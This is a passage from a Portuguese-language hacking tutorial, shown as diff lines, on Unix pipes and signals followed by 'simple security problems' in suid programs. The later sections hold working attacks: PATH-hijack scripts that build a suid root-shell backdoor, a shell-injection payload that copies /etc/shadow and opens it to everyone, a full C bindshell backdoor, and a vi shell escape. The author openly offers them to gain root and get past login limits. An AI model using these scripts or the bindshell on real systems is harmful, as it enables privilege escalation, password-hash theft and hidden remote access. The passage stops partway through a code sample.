+FILE *alvo;
+
+main(){
+char *string = "HACKER";
+alvo = popen("./recebe","w"); /* Cria arquivo pipe */
+fprintf(alvo,"%s",string);    /* Envia string para Programa */
+pclose(alvo); /* Fechar Arquivo Pipe */
+printf("\nArquivo Executado com Sucesso!\n");
+return 0;
+}
+-------------------------------------------------------------------------
+
+Aih estah um exemplo de pipe via popen().Veja a Interacao entre os dois
+programas acima.Este eh um exemplo simples, nao se preocupe como o modo
+com que os dados sairam na tela.
+
+Como podemos notar, existe uma semelhanca muito grande entre manipular um
+pipe criado via popen e manipular(ler e/ou escrever) um arquivo via fopen().
+Mas lembrando, existem diferencas e devemos ter em mente que sao situacoes
+diferentes, voce verah isso mais abaixo.Vejamos agora o outro metodo para
+se criar um pipe:
+
++ pipe() -> int pipe(int fd[2])
+
+ Cria um pipe e retorna dois arquivos descritors(file descriptors), fd[0],
+ fd[1].fd[0] eh aberto para leitura e  fd[1] para escrita.O modelo de
+ programacao padrao eh que apos o pipe ter sido setado, dois ou mais
+ processos cooperativos irao ser criados por um fork() e dados serao 
+ tranferidos usando read() e write().
+ Um pipe aberto com pipe() deve ser fechado usando close(int fd).
+
+Abaixo segue um exemplo de um programa que cria um pipe por este metodo:
+
+----------------------------- pipefd1.c ------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+main()
+{
+int pfds[2];
+char buf[30];
+if (pipe(pfds) == -1) {
+perror("pipe");
+exit(1);
+        }
+printf("Escrevendo do File Descriptor #%d\n", pfds[1]);
+write(pfds[1], "HACKER", 7);
+printf("Lendo do File Descrriptor #%d\n", pfds[0]);
+read(pfds[0], buf, 7);
+printf("File Descriptor #%d escreveu: \"%s\"\n",pfds[1], buf);
+    }
+------------------------------------------------------------------------
+
+Note que um File Descriptor envia dados para outro.Como foi dito, pfds[0]
+eh o File Descriptor de Recebimento ou de Leitura, e o pfds[1] eh o
+File Descriptor de Envio ou de Escrita.Vejamos o exemplo abaixo com o
+uso de fork();
+
+----------------------------- pipefd2.c --------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+main() {
+int pfds[2];
+char buf[30];
+
+pipe(pfds); /* Cria o pipe */
+
+if (!fork()) { /* Cria um processo filho */
+printf(" FILHO: escrevendo para o pipe\n");
+write(pfds[1], "test", 5); /* Escreve para pfds[1] */
+printf(" FILHO: saindo\n");
+exit(0);  }
+else {
+printf("PAI: Lendo do pipe\n");
+read(pfds[0], buf, 5); /* le de pfds[0] */
+printf("PAI: \"%s\" lido\n", buf);
+wait(NULL);
+      }
+ }
+-----------------------------------------------------------------------
+
+Executando este programa a sua saide deve ser:
+
+$ ./pipefd2
+PAI: Lendo do pipe
+ FILHO: escrevendo para o pipe
+ FILHO: saindo
+PAI: "test" lido
+
+Como podemos ver, nao tem muito segredo, na interacao usando pipe() e
+fork().Tenhamos em mente que um File Descriptor eh para escrita e o outro
+para leitura.
+
+Veremos agora o uso de pipe() em um processo conhecido, por exemplo,
+o que vimos acima: "cat /etc/passwd | grep 'adm'"; Usando o mesmo metodo
+descrito acima, estamos habilitados a executar interacoes deste tipo.
+
+
+------------------------------ pipefd4.c --------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(){
+int pfds[2];
+char arquivo[20], usuario[20];
+strcpy(arquivo,"/etc/passwd");
+sprintf(usuario,"adm");
+pipe(pfds);
+
+if (!fork()) {
+close(1);       /* Fecha Saida Padrao(stdout) */
+dup(pfds[1]);   /* Torna pfds[1] saida padrao */
+close(pfds[0]);
+execlp("/bin/cat", "cat",arquivo, NULL);
+} else {
+close(0);       /* Fecha entrada padrao(stdin) */
+dup(pfds[0]);   /* Torna pfds[0] entrada padrao */
+close(pfds[1]);
+execlp("/usr/bin/grep", "grep",usuario, NULL);
+     }
+}
+-------------------------------------------------------------------------
+
+Como podemos ver, este eh um esquema muito eficiente.A novidade reside
+em usarmos dup().Dup eh usado para duplicar um File Descriptor.Sua
+Sintaxe eh:
+
+#include <unistd.h>
+
+int dup(int oldfd);
+
+Maiores detalhes sobre esta funcao podem ser encontrados na sua man page.
+Agora que voce sabe o que sao pipes, e como cria-los vamos ver agora o 
+que sao sinais, e para que servem.
+
+3.4. - Signals
+---------------
+
+Manipulacao de Sinais eh algo fundamental quando lidamos com IPC.Quando
+um processo nao termina normalmente ele usualmente tente enviar um sinal
+indicando que algo estah errado.Os Signals(sinais) sao gerados por
+interrupcoes de software que sao enviados para um processo quando um 
+evento acontece.Sinais podem ser gerados sincronizadamente
+por um erro em uma aplicacao, mas a maioria dos sinais nao agem 
+sincronizadamente.Sinais podem ser enviados para um processo quando o
+sistema detecta um evento de software, igual quando um usuario manda
+interromper ou killar requisicoes de outro processo(kill).
+Sinais podem tambem serem enviados diretamente do kernel do Sistema
+Operacional quando um evento no hardware falha, como 'bus error' ou
+'illegal instruction'. O sistema define um set de sinais que podem ser
+enviados para um processo.Alguns sinais param o recebimento de dados de
+um processo e outros sinais podem ser ignorados.Cada sinal possui uma
+acao padrao que pode ser uma das seguintes:
+
+* O sinal eh descartado apos ser recebido;
+* O Processo eh terminado apos o recebimento do sinal;
+* Um arquivo core eh escrito, entao o processo eh terminado;
+* Um Processo eh parado apos o recebimento de um sinal;
+
+Para maiores informacoes sobre as acoes de varios sinais consulte a man
+page de 'sigaction' e 'kill'.
+
+Os MACROS referentes a varios sinais sao definidos no arquivo <signal.h>,
+ele inclui, dentre outros, o seguintes macros:
+
+SIGHUP    -> Hangup 
+SIGINT    -> Interrupcao
+SIGQUIT   -> Saida
+SIGILL    -> Instrucao Ilegal
+SIGABRT   -> Usado para Abortar
+SIGKILL   -> Kill
+SIGALRM   -> Alarm Clock
+SIGCONT   -> Continua um Processo Parado
+SIGCHLD   -> Para ou Sai(Enviado por um Processo Pai p/ um Filho).
+SIGSTOP   -> Para um Processo.
+SIGFPE    -> Operacoes Aritmeticas Erroneas.
+SIGPIPE   -> Escreve em um pipe sem outro para ler ele.
+SIGSEGV   -> Pessoal que gosta de overflows!!:).Sinal que indica
+	     referencia invalida de memoria.
+SIGTERM   -> Sinal Terminal.
+SIGUSR1   -> Sinal 1 do usuario definido.
+SIGUSR2   -> Sinal 2 do usuario definido.
+SIGTSTP   -> Sinal Terminal Parado, enviado para um processo parado.
+SIGTTIN   -> Processo de tentativa de leitura em background.
+SIGTTOU   -> Processo de tentativa de escrita em background.
+SIGBUS    -> Bus error.
+SIGPOLL   -> Evento nomeavel.
+SIGPROF   -> Tempo de perfil(contorno) expirado.
+SIGSYS    -> System Call errado(bad).
+SIGTRAP   -> Laca(prende) Trace/breakpoint.
+SIGURG    -> Dados de bandwidth alta estah disponivel em um socket.
+SIGVTALRM -> Marcador(timer) virtual expirado.
+SIGXCPU   -> Tempo limite da CPU excedido.
+SIGXFSZ   -> Tamanho limite de arquivo excedido.
+
+Os sinais podem ser numerados de 0 ateh 31.
+
+Funcoes:
+--------
+
+Existem duas funcoes mais comuns usadas para enviar sinais.Sao elas:
+
+int kill(int pid, int signal) - Usada para enviar um sinal para um 
+				processo, PID.Se PID eh maior que zero,
+				o sinal eh enviado ao processo ao qual
+				o process ID eh igual ao PID.Se PID eh
+				igual a zero, o sinal eh enviado para
+				todos os processos, exceto os processos
+				do sistema(o que mandou enviar).
+
+int raise(int sig) - Envia o sinal sig para o programa em execucao.
+		     Atualmente raise() usa kill() para enviar o sinal
+		     para o programa em execucao:
+
+kill(getpid(), sig);
+
+Alem dessas duas funcoes, uma eh mais importante, a que manuseia os
+sinais.Eh a funcao signal().Sua sintaxe segue abaixo:
+
+#include <signal.h>
+
+void (*signal(int signum, void (*handler)(int)))(int);
+
+O system call 'signal' instala um novo manuseador de sinais para o sinal
+com numero 'signum'.O manuseador de sinal eh setado para manusear o
+que deve estar especifico em uma funcao do usuario, ou um dos seguintes
+macros:
+
+SIG_IGN -> Ignora o sinal.
+SIG_DFL -> Reseta o sinal para seu estado padrao.
+
+Vamos ver um exemplo abaixo, usando uma funcao do usuario para manipular
+sinais:
+
+-------------------------------- sig1.c ---------------------------------
+#include <stdio.h>
+#include <unistd.h>
+#include <signal.h>
+
+void sigproc();
+void quitproc();
+
+main()
+{
+signal(SIGINT,&sigproc);
+signal(SIGQUIT,&quitproc);
+printf("ctrl-c disabilitado use ctrl - \\ para sair do programa.\n");
+for(;;);
+}
+
+void sigproc()
+{
+signal(SIGINT,sigproc);
+printf("Se quer sair do programa digite ctrl - \\\n");
+}
+
+void quitproc(){
+printf("\nSaindo do Programa!!\n\n");
+exit(0);
+}
+--------------------------------------------------------------------------
+
+Compile este programa e depois tente sair dele usando 'Ctrl - c'.
+O Manuseio de sinais pode ser uma boa para um fucador, principalmente 
+quando escrevemos DoS que consomem ciclos de maquina, e backdoors que
+criam processos 'filhos'(fork()).Vamos analisar um exemplo disto abaixo:
+
+------------------------------- sig2.c ---------------------------------
+#include <stdio.h>
+#include <signal.h>
+#include <sys/types.h>
+
+main() {
+int pid;
+
+if ((pid = fork()) < 0) {
+perror("fork");
+exit(1);
+}
+
+if (pid == 0){ /* Processo filho */
+signal(SIGQUIT, SIG_DFL);
+for(;;); /* loop infinito, demontra um exemplo apenas */
+     }
+else{ /* processo pai */
+printf("\nEnviando SIGQUIT para processo FILHO!\n\n");
+kill(pid,SIGQUIT);
+sleep(2);
+     }
+printf("Continuando Execucao normal...\n");
+}
+-------------------------------------------------------------------------
+
+Execute o programa acima.Note o seguinte, o programa cria um processo
+filho, executa uma acao(loop infinito), o processo pai envia um SIGQUIT
+para terminar processo filho e depois o programa segue a sua execucao 
+normal.Qual a utilidade disto para um fucador?? Algumas condicoes de
+corrida utilizam este conceito, enquanto se eleva uma uid para a 
+execucao de um processo em 'background', envia-se um sinal para que se
+possa tirar proveito disto.
+
+O Basico sobre sinais eh isto aih, treine na pratica que voce serah bem
+sucedido no manuseio deles.Neste tutorial foi descrito somente o basico,
+em breve mais coisas serao descritas, de uma olhada nos links que
+disponibilizo no final.
+
+------------------------------------    
+4. - PROBLEMAS SIMPLES DE SEGURANCA |
+------------------------------------
+
+Neste item pretendo enumerar alguns problemas de seguranca bastante
+comuns e amplamente divulgados na Internet.Alguns conceitos sao bem
+abrangentes e algumas tecnicas envolvem ou nao o conceito de IPC.
+Esses problemas tendem a serem 'menosprezados' por grande parte dos
+programadores pois os mesmos se concentram mais na 'moda' do momento, ou
+seja, os programadores de preocupam com Buffer Overflows, mas se esquecem
+das dezenas de outros problemas de seguranca que um programa pode vir a
+apresentar.
+
+4.1. - popen() + Environment
+-------------------------------
+
+popen() eh uma funcao bastante conhecida.Ela busca informacoes sobre a
+localizacao de um arquivo usando chamadas para a Shell(BASH).Logo, em
+alguns casos ela pode estar vulneravel atraves do uso de variaveis 
+Environment.No inicio do tutorial de IPC, eu coloquei um simples programa
+que interagia com outro usando pipe().Vamos adaptar este mesmo programa
+para ilustrar uma situacao de vulnerabilidade para nos:
+
+---------------------------- popen_bug.c -------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+FILE *alvo;
+main(){
+char *string = "HACKER";
+setuid(0);
+alvo = popen("./alvo","w"); /* Cria arquivo pipe */
+fprintf(alvo,"%s",string);    /* Envia string para Programa */
+pclose(alvo); /* Fechar Arquivo Pipe */
+printf("\nArquivo Executado com Sucesso!\n");
+return 0;
+}
+
+------------------------------------------------------------------------
+
+Note que popen() abre um arquivo no diretorio atual.Se nos modificarmos
+nossa Environment PATH, ele irah abrir o arquivo alvo que desejarmos.
+Compile o programa acima e torne-o suid para que possamos ilustrar melhor.
+Abaixo segue um shell script que pode ser usado em /tmp para nos dar uma
+root shell em cima da vulnerabilidade acima:
+
+---------------------------- detonaopen.sh -----------------------------
+
+#!/bin/sh
+# Detona popen()
+# Especifique o PATH correto, aonde se encontra
+# o arquivo bugado.
+
+/usr/bin/clear
+/bin/echo "CRIANDO ARQUIVO QUE SERAH BACKDOOR!!"
+
+/bin/cat << _FIM_ > backdoor.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+main(){
+setuid(0);
+execl("/bin/sh","sh",0);
+return 0;
+}
+_FIM_
+/bin/echo "CRIANDO SCRIPT ALVO"
+/bin/cat << _FIM_ > alvo
+/usr/bin/gcc -o backdoor backdoor.c
+/bin/chmod +s backdoor
+_FIM_
+
+/bin/chmod +x alvo
+
+export PATH=./
+#Defina o PATH correto abaixo.
+
+/usr/local/bin/popen_bug
+
+/bin/echo "PROGRAMA EXECUTADO COM SUCESSO!!"
+/bin/echo "LAH VEM SUID SHELL!!"
+./backdoor
+
+-----------------------------------------------------------------------
+
+Torne o arquivo acima executavel e depois execute-o.Verah que funciona
+perfeitamente e a vulnerabilidade existe.Com o aumento do numero de
+programadores para Linux, estes esquemas que para muitos parece bobo
+podem representar um grande risco para a seguranca de uma rede.
+
+Este problema envolvendo Environments eh bastante comum em varias outras
+funcoes, vou demonstrar aqui somente com system() e shell scripts, mas
+execlp() e execvp() usam a Environment PATH, logo podem estar vulneraveis
+a implementacao eficaz desta tecnica.
+
+4.2. - Problemas com system()
+--------------------------------
+
+Esta eh uma funcao perigosissima, seja como for, jamais deve ser usada.
+Existem susbtitutas para ela que fazem a mesma coisa com alguns parametros
+a mais de seguranca.Mas parece que os nossos 'bons' programadores nao
+querem dar ouvidos a nossa 'boa' comunidade de seguranca, pois diversos
+programas continuam a usar esta funcao bugada.Vejamos abaixo, um programa
+exemplo, para ilustrarmos alguns problemas que envolvem esta funcao:
+
+----------------------------- system_bug1.c ------------------------------
+/* PROGRAMA BUGADO EM SYSTEM */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define   ERRO   -1
+
+main(int argc, char *argv[]){
+char comando[40];
+int protecao;
+if(argc < 2){
+printf("Uso: %s <usuario>\n",argv[0]);
+exit(0);
+}
+protecao = strlen(argv[1]);
+if(protecao > 15){
+printf("\nUsuario Inexistente! Ferramenta de IDS logou voce!!\n");
+printf("Ou voce Hackeia o sistema e muda os logs ou tah lascado!!:)\n\n");
+exit(ERRO);
+}
+else{
+setuid(0); /* Ilustraremos um suid root */
+sprintf(comando,"w %s",argv[1]);
+system(comando);
+}
+return 0;
+}
+--------------------------------------------------------------------------
+
+Compile-o normalmente de depois coloque-o como suid root 'chmod +s'.
+
+Digamos que voce se depare com um programa deste tipo numa rede qualquer,
+voce nao tem acesso ao codigo fonte, e pensa em seguir os seguintes
+passos:
+
+* Procura por suid:
+
+$ ls -l system_bug1
+-rwsr-sr-x   1 root     root        12355 Jul  2 09:16 system_bug1
+
+Voce pensa: 'Oba!! Um programa suid root!!! Ele nao eh um programa famoso,
+            logo deve ter bugs!!'
+
+* Aih voce decide investigar de forma suscinta executando ele:
+
+$ ./system_bug1
+Uso: ./system_bug1 <usuario>
+
+Voce pensa: 'Eita, ele aceita parametros da linha de comando, uma string
+	     de caracters, pode estar vulneravel a buffer overflow'.
+
+* Entao voce decide investigar melhor e usa o comando strings:
+
+$ strings system_bug1 | less
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+printf
+system
+__deregister_frame_info
+sprintf	<------------------------ Olha isso aqui!
+exit
+_IO_stdin_used
+__libc_start_main
+strlen
+__register_frame_info
+GLIBC_2.0
+PTRh`
+Programa Exemplo para system() bugado!
+Uso: %s <usuario>
+Usuario Inexistente! Ferramenta de IDS logou voce!!
+Ou voce Hackeia o sistema e muda os logs ou tah lascado!!:)
+w %s
+init.c
+/tmp/glibc-2.1.2/csu/
+gcc2_compiled.
+....
+....(Um monte de coisas)
+
+Voce olha soh para uma coisa e se alegra:"Tem sprintf!!"; (esquecendo de
+olhar o resto) e voce jah sabe que sprintf eh uma funcao amplamente 
+conhecida como sendo vulneravel a buffer overflow.
+
+* De posse dessas informacoes voce resolve testar, digitando primeiro um
+  usuario valido:
+
+$ ./system_bug1 nashleon
+  9:27am  up  5:47,  4 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+nashleon tty4     -                 3:52am  1:21m  0.52s  0.52s  bash
+
+Voce nao consegue notar de cara que o programa estah interagindo com
+outro(/usr/bin/w).E resolve entao atacar e tentar gerar uma 'Segmentation
+Fault':
+
+$ ./system_bug1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAA
+
+Usuario Inexistente! Ferramenta de IDS logou voce!!
+Ou voce Hackeia o sistema e muda os logs ou tah lascado!!:)
+
+$
+
+Neste ponto, muitos sairiam correndo, outros iriam se desesperar em busca
+de saber o que tinha acontecido, e outros, uns poucos, ficariam calmos,
+vendo que ainda cairam na '$' e que nem tudo estava perdido.. 
+
+O que eu quis ilustrar eh algo que vem ocorrendo com frequencia hoje em 
+dia, na verdade sao duas coisas: "AS APARENCIAS ENGANAM!!", o programa
+pode parecer estar vulneravel a um buffer overflow, mas no entanto ele
+pode ser um 'pega-kiddie'; Segundo: "NAO EXISTE SOH BUFFER OVERFLOW COMO
+TECNICA EFETIVA PARA SE CONSEGUIR EXECUTAR COMANDOS COMO OUTRO USUARIO!"
+Existem varias outras tecnicas e algumas em alguns casos muito mais
+simples e eficazes do que 'Buffer Overflow'.
+
+Agora vamos ver o que podemos fazer com isso, o overflow nao foi possivel,
+mas o programa eh suid, devemos entao analisar novamente, com calma, sem
+precipitacao:
+
+$ strings system_bug1 | more
+/lib/ld-linux.so.2
+__gmon_start__
+libc.so.6
+printf
+system
+__deregister_frame_info
+sprintf
+exit
+_IO_stdin_used
+__libc_start_main
+strlen
+__register_frame_info
+GLIBC_2.0
+PTRh`
+Programa Exemplo para system() bugado!
+Uso: %s <usuario>
+Usuario Inexistente! Ferramenta de IDS logou voce!!
+Ou voce Hackeia o sistema e muda os logs ou tah lascado!!:)
+w %s
+init.c
+/tmp/glibc-2.1.2/csu/
+gcc2_compiled.
+int:t(0,1)=r(0,1);0020000000000;0017777777777;
+
+Analisando com calma, vemos uma chamada para system(), e sabemos que 
+system() jamais deve ser usado! Mas o que eh esse system() afinal??Veremos
+o que ela eh o que faz rapidamente para que nao haja duvidas.
+
+4.2.1. - A funcao system()
+----------------------------
+
+Esta eh uma funcao que simplesmente executa um comando shell.Sua sintaxe
+eh:
+
+#include <stdlib.h>
+
+int system (const char * string);
+
+Onde 'const char *string' eh um ponteiro para o comando que se quer
+executar, ou seja, system() executa um comando especifico da seguinte 
+maneira:
+
+/bin/sh -c string
+
+Enquanto system() estiver sendo executado, SIGCHLD serah bloqueado, e
+SIGINT e SIGQUIT serao ignorados, justamente para, dentre outras coisas,
+evitar 'Race conditions'.
+
+Um exemplo classico de system segue abaixo:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(){
+system("clear"); /* Note que isto eh muito comum mesmo em varios programas */
+system("ls");
+}
+
+Executa um simples 'clear' e depois um 'ls'.
+
+4.2.2. - Detonando system()
+-----------------------------
+
+Eh recomendavel usar um PATH absoluto no uso de system(), mas no entanto,
+ainda assim, alguns esquemas sao possiveis.No nosso exemplo existe uma
+simples chamada 'w' ao inves de '/usr/bin/w', justamente o modo mais facil
+de se 'exploitar'.
+
+Existem diversos modos de se pegar o comando, no nosso exemplo, vimos 
+algumas coisas via 'strings':
+
+....
+system
+....
+Uso: %s <usuario> -> Note: %s para argv[0], devemos entao procurar algum
+		     '%' para argv[1];
+....
+w %s  -> Olha ele aqui, podemos entao perceber que system() executa o
+....     comando w, recebendo argumento %s, provavelmente(no nosso caso
+	 com certeza eh) de sprintf().
+ 
+Voce poderia exploitar este dito cujo 'na mao' digitando comando por
+comando, mas irei descrever abaixo um shell script para que voce jah possa
+ir vendo mais coisas sobre 'programacao em BASH':
+
+--------------------------- detona_system.sh ----------------------------
+
+#!/bin/bash
+# Script para Exploitar um programa bugado
+# com system().Feito para tutorial de programacao
+# diversa.Desenvolvido por Nash Leon.
+
+/usr/bin/clear
+/bin/echo "CRIANDO ARQUIVO QUE SERAH BACKDOOR!!"
+#Na linha abaixo comecamos a criar um arquivo .c(backdoor)
+/bin/cat <<_FIM_ > back.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+main(){
+setuid(0);
+execl("/bin/sh","sh",0);
+return 0;
+}
+_FIM_
+
+#Abaixo criamos um shell script que executarah os comandos via bug
+
+/bin/cat <<_FIM_ > w
+#!/bin/sh
+/usr/bin/gcc -o back back.c
+/bin/chmod +s back
+_FIM_
+
+/bin/chmod +x w
+
+#Abaixo exportamos a environ PATH para se tornar ./
+#Assim ao inves de procurar em /usr/bin/w irah procurar em ./w
+#que eh justamente nosso shell script acima.
+
+export PATH=./
+
+#Mude Abaixo para o PATH onde se localiza seu programa bugado
+
+/usr/bin/system_bug1 detonado
+
+/bin/echo "PROGRAMA EXECUTADO COM SUCESSO!!OS HACKERS SAO MELHORES!!!"
+
+#Acima nos finalmente executamos o programa bugado, com um argumento
+#de 'resposta' ao admin..:)
+
+./back
+
+#Acima nos executamos a backdoor para cairmos direto na root shell.
+
+------------------------------------------------------------------------
+
+Para sermos bem sucedidos, basta fazermos:
+
+$ chmod +x detona_system.sh
+$ ./detona_system.sh
+CRIANDO ARQUIVO QUE SERAH BACKDOOR!!
+PROGRAMA EXECUTADO COM SUCESSO!!OS HACKERS SAO MELHORES!!!
+sh-2.03# /usr/bin/id
+uid=0(root) gid=100(users) groups=100(users)
+sh-2.03# exit
+exit
+
+Aih estah mano... Esquemas como este, tao simples assim eh dificil de
+achar, alem do mais com suid root, mas o importante eh conhecermos a
+tecnica, pois como vimos na ilustracao, esse esquema pode vir a ser util.
+Mas e se fosse '/usr/bin/w' ao inves de soh 'w'.Acho que nao tem muito
+segredo nao, pois ele estah recebendo uma string da linha de comando, ou
+seja, podemos passar do mesmo jeito.Vejamos o mesmo exemplo mas com o
+PATH absoluto abaixo:
+
+----------------------------- system_bug2.c ------------------------------
+/* PROGRAMA BUGADO EM SYSTEM */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define   ERRO   -1
+
+main(int argc, char *argv[]){
+char comando[40];
+int protecao;
+if(argc < 2){
+printf("Uso: %s <usuario>\n",argv[0]);
+exit(0);
+}
+protecao = strlen(argv[1]);
+if(protecao > 15){
+printf("\nUsuario Inexistente! Ferramenta de IDS logou voce!!\n");
+printf("Ou voce Hackeia o sistema e muda os logs ou tah lascado!!:)\n\n");
+exit(ERRO);
+}
+else{
+setuid(0);
+sprintf(comando,"/usr/bin/w %s",argv[1]);
+system(comando);
+}
+return 0;
+}
+---------------------------------------------------------------------------
+
+Compile-o novamente e coloque-o suid root para ilustrarmos melhor.
+Para passarmos por ele, basta usarmos a 'malicia' que a shell nos 
+proporciona, um exemplo segue abaixo no shell script:
+
+---------------------------- detona_system2.sh ----------------------------
+
+#!/bin/bash
+#Shell Script para copiar o shadow se aproveitando
+#de um programa bugado em system()
+
+/bin/echo "CRIANDO ARQUIVO COPIA SHADOW..."
+/bin/cat << _FIM_ > copia.sh
+#!/bin/sh
+/bin/cp /etc/shadow /home/nashleon
+/bin/chmod 777 /home/nashleon/shadow
+#EOF
+_FIM_
+
+/bin/chmod +x copia.sh
+/bin/echo "ARQUIVO CRIADO COM SUCESSO!!"
+/bin/echo "DETONANDO SYSTEM()!!"
+sleep 1
+PATH=./
+/crazy/my/ipc/system_bug "abcd;copia.sh"
+
+--------------------------------------------------------------------------
+
+
+Sem duvida que bastaria voce digitar o seguinte para cair numa suid shell:
+
+$ /path/system_bug2 "oi;/bin/sh"
+
+Coloquei o shell script mais uma vez para ir adiantando algo sobre
+programacao em shell script.Pense bem antes de user system() em um
+programa qualquer, no caso acima, eles eram suid roots, sem duvida isto
+eh meio improvavel, mas tudo eh possivel nao devemos esquecer das
+condicoes que envolvem sistemas NFS, SAMBA, acesso FTP diferenciado de
+SHELL, enfim, existem esquemas possiveis para se fazer em cima desta
+vulnerabilidade.As variaveis Environment representam um perigo
+consideravel, existem funcoes mais seguras que devem ser usadas ao inves
+de system, ou mesmos, procurar filtrar caracters, no entanto, os filtros
+em alguns casos pode-se passar por eles tambem, recomendo mesmo eh a nao
+utilizacao desta funcao.
+
+4.3. - Problemas com Shell Scripts
+------------------------------------
+
+Assim como nos exemplos jah visto, problemas com Shell Scripts tambem
+sao comuns quando envolvem variaveis Environment.Ao inves de executar
+um dado comando especifico, voce poderah setar uma variavel environment
+para tirar proveito proprio.Por exemplo:
+
+#!/bin/sh
+w
+#EOF
+
+Voce poderia setar a variavel PATH para './' ou qualquer dir e criar um
+arquivo w contendo instrucoes a serem executadas.
+
+Gostaria de tornar publico um problema muito frequente.Existem programas
+que 'dizem' nao permitir mais de um login por usuario.Sem duvida que um
+usuario leigo iria ser 'barrado' neste esquema, mas nao se deve confiar
+nestes programas, as formas de passar pelos mesmos sao bastante faceis,
+se voce deseja ter mais de um acesso a shell, 'passe' pelo /bin/login.
+Para isso, um esquema util eh executar uma bindshell, exemplo segue
+abaixo:
+
+--------------------------- NL_bindshell.c ------------------------------
+
+/* Simples programa que binda uma Shell a uma porta.
+   Desenvolvido por Nash Leon vulgo coracaodeleao.
+   nashleon@yahoo.com.br */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+/* Se quiser mudar o numero da porta abaixo, sinta-se a vontade */
+
+#define  PORTA    20000
+#define  ERRO        -1
+
+int binda(){
+int Meusocket;
+int tamanho, conector;
+struct sockaddr_in hacker;
+struct sockaddr_in vitima;
+char engana[50];
+
+if(fork() == 0){
+vitima.sin_family=AF_INET;
+vitima.sin_addr.s_addr= htonl(INADDR_ANY);
+vitima.sin_port= htons(PORTA);
+bzero(&(vitima.sin_zero), 8);
+Meusocket = socket(AF_INET,SOCK_STREAM,0);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket()!\n");
+exit(ERRO);
+                 }
+bind(Meusocket,(struct sockaddr *)&vitima,sizeof(vitima));
+if(bind < 0){
+fprintf(stderr,"Erro em bind()!\n");
+exit(ERRO);
+}
+listen(Meusocket,1);
+tamanho = sizeof(hacker);
+conector=accept(Meusocket,(struct sockaddr *)&hacker,&tamanho);
+
+if(conector < 0){
+fprintf(stderr,"Erro em accept()!\n");
+                }
+dup2(conector,0);
+dup2(conector,1);
+dup2(conector,2);
+execl("/bin/sh","sh",0);
+}
+}
+
+main(void){
+binda();
+}
+-----------------------------------------------------------------------
+
+Se voce nao sabe construir um programa igual a este acima, recomendo a
+leitura dos meus tutoriais basicos de sockets em C e o tutorial basico
+de backdoors em Linux, voce pode acha-los na pagina do Unsekurity Team.
+Esse programa acima une uma shell a uma porta alta do sistema, execute-o
+e depois tudo que voce precisa fazer eh dar um telnet para a porta alta.
+
+Outros problemas que envolvem os Shells Scripts residem nas permissoes,
+se um shell script eh suid root e possui problemas de Environment, o
+sistema jah era, se o shell script eh world/writable ou seja, qualquer
+um pode escrever, o sistema tambem jah era, enfim, problemas com Shell
+Scripts pode ser comum em usuarios menos experientes.Talvez em breve eu
+disponibilize algum material mais abrangente sobre os varios tipos de
+shell, fique atento!
+
+4.4. - Chamadas Para vi 
+-----------------------
+
+Recentemente eu analisando um banco de dados muito usado e amplamente
+conhecido no mundo Linux vi uma chamada para vi sem setar corretamente os
+parametros, logo, eh possivel que problemas envolvendo o vi ou algum outro
+editor de texto com esses 'poderes' possa ser usado de forma maliciosa.
+Vejamos abaixo um simples exemplo ilustrativo deste problema:
+
+------------------------------- vi_bug.c --------------------------------
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[]){
+char banco[50];
+printf("Comecando interacao...\n");
+printf("Digite o nome do banco de dados: ");
+scanf("%49s",banco);
+setuid(0); /* Eleva uid */
+execl("/usr/bin/vi","vi",banco,0);
+return 0;
+}
+
+-------------------------------------------------------------------------
+
+Compile o programa acima e torne-o suid root para demonstrarmos de modo
+bastante claro os problemas que isto possa vir a causar.
+Note que antes dele chamar a execucao de vi ele aumenta a uid efetiva,
+o que podemos fazer com isso eh executar o programa acima e quando
+entrarmos no 'vi' basta digitarmos ':!sh' e cairemos numa shell suid root.
+se voce possui acesso somente ao banco de dados mSQL poderah esquematizar
+algo neste sentido, alguns programas usam o editor recebendo como parametro
+uma environment(EDITOR), em alguns casos mudando-se a environment pode-se
+tirar proveito em cima do programa.
+
+4.5. - Problemas com File Descriptors
+--------------------------------------
+
+O mah contrucao e uso de File Descriptors eh outro problema muito comum de
+seguranca.Irei descrever esquemas ultra-basico, este tutorial esta ficando
+enorme, mas vai pegando os conceitos e expandindo com suas teorias.
+Vamos analisar o esquema abaixo:
+
++ Vejamos as permissoes de um arquivo que soh o root pode ver:
+
+# ls -l /etc/shadow
+-rw-------   1 root     root          479 Jun 24 08:22 /etc/shadow
+
+Somente o root tem permissao de leitura e escrita neste arquivo, como
+podemos ver perfeitamente.
+
++ Vamos analisar um simples programa que abre o arquivo /etc/shadow, mas
+  que possui um problema com arquivo descriptor.
+
+------------------------------- fd_bug.c ---------------------------------
+#include <stdio.h>
+#include <unistd.h>
+
+main(){
+int fd;
